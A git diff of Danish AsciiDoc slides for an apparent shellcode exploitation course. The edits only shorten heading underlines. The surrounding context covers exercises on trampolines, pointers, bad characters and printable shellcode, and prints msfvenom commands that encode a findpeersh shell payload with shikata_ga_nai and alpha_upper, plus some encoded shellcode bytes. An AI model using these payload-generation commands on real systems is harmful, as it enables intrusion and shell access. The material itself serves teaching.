@@ -38,7 +38,7 @@ Choose from the menu:
 ------------------------------------------------
 
 Opgave 6 - 'ESP' + meget få bytes
--------------------------------------
+---------------------------------
 [source,bash]
 ------------------------------------------------
  2) Trampoline can only execute few bytes
@@ -51,13 +51,13 @@ include::../assignments/trampoline_few_bytes[]
 ------------------------------------------------
 
 Opgave 6 - 'ESP' + meget få bytes
--------------------------------------
+---------------------------------
 Typisk for off-by-a-few bugs.
 
 image:../images/off-by-a-few.png[]
 
 Opgave 6 - 'ESP' + meget få bytes
--------------------------------------
+---------------------------------
 Typisk for off-by-a-few bugs.
 
 image:../images/off-by-a-few-solution.png[]
@@ -65,7 +65,7 @@ image:../images/off-by-a-few-solution.png[]
 Short jumps (+127/-128) kan gøres på to bytes, skal man længere fylder det fem bytes.
 
 Opgave 7 - Læste pointer
-----------------------------
+------------------------
 [source,bash]
 ------------------------------------------------
  3) Read pointers
@@ -76,11 +76,11 @@ include::../assignments/read_pointers[]
 ------------------------------------------------
 
 Opgave 7 - Læste pointer
-----------------------------
+------------------------
 image:../images/read_pointer.png[]
 
 Opgave 7 - Læste pointer
-----------------------------
+------------------------
 image:../images/read_pointer-solution.png[]
 
 I en ikke position independent executable:
@@ -93,7 +93,7 @@ $ cat /proc/12708/maps | grep shelly
 ------------------------------------------------
 
 Opgave 8 - Skrevne pointere
--------------------------------
+---------------------------
 [source,bash]
 ------------------------------------------------
  4) Write pointers
@@ -104,11 +104,11 @@ include::../assignments/write_pointers[]
 ------------------------------------------------
 
 Opgave 8 - Skrevne pointere
--------------------------------
+---------------------------
 image:../images/write_pointer.png[]
 
 Opgave 8 - Skrevne pointere
--------------------------------
+---------------------------
 image:../images/write_pointer-solution.png[]
 
 I en ikke position independent executable:
@@ -121,7 +121,7 @@ $ cat /proc/12708/maps | grep shelly
 ------------------------------------------------
 
 Opgave 9 - Krævede konstanter
----------------------------------
+-----------------------------
 [source,bash]
 ------------------------------------------------
  5) Required constants
@@ -133,11 +133,11 @@ include::../assignments/required_constants[]
 ------------------------------------------------
 
 Opgave 9 - Krævede konstanter
----------------------------------
+-----------------------------
 image:../images/required_constants-solution.png[width="800"]
 
 Opgave 10 - Filtre (bad chars)
----------------------------------
+------------------------------
 [source,bash]
 ------------------------------------------------
  6) Avoid certain chars
@@ -148,11 +148,11 @@ include::../assignments/avoid_chars[]
 ------------------------------------------------
 
 Opgave 10 - Filtre (bad chars)
----------------------------------
+------------------------------
 image:../images/encoder_decoder.png[]
 
 Opgave 10 - Filtre (bad chars)
----------------------------------
+------------------------------
 [source,bash]
 ------------------------------------------------
 $ shellcraft i386.linux.findpeersh | msfvenom --encoder x86/shikata_ga_nai --bad-chars '\x00\x0a\x0d\x20\x3d\x3b' --arch x86 --platform linux --format py
@@ -169,7 +169,7 @@ buf += "\x5b\x14\xe3\x6f\x6d\x4c\xef\xd7\xf4\x5c\x6f"
 Det er lidt forskelligt hvor meget Shikata Ga Nai decoderen fylder, men omkring 25-30 bytes. Hver byte i den oprindelige shellcode tilføjer én enkodet byte.
 
 Opgave 11 - Printable
-------------------------
+---------------------
 [source,bash]
 ------------------------------------------------
  7) Shellcode needs to be printable
@@ -180,7 +180,7 @@ include::../assignments/printable_shellcode[]
 ------------------------------------------------
 
 Opgave 11 - Printable
-------------------------
+---------------------
 [source,bash]
 ------------------------------------------------
 $ shellcraft i386.linux.findpeersh | msfvenom --encoder x86/alpha_upper --arch x86 --platform linux BufferRegister=EAX
